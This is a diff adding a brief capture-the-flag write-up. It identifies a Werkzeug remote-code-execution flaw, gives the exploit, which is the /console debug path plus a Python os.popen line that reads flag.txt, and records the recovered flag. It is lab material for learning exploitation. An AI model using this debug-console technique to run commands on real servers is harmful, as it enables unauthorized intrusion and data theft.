@@ -1,0 +1,9 @@
+Analysis:
+Vulnerable to Werkzeug RCE
+
+Exploit:
+uri_path/console
+import os;print(os.popen("cat flag.txt").read())
+
+Flag:
+flag{weurkzerg_the_worst_kind_of_debug}
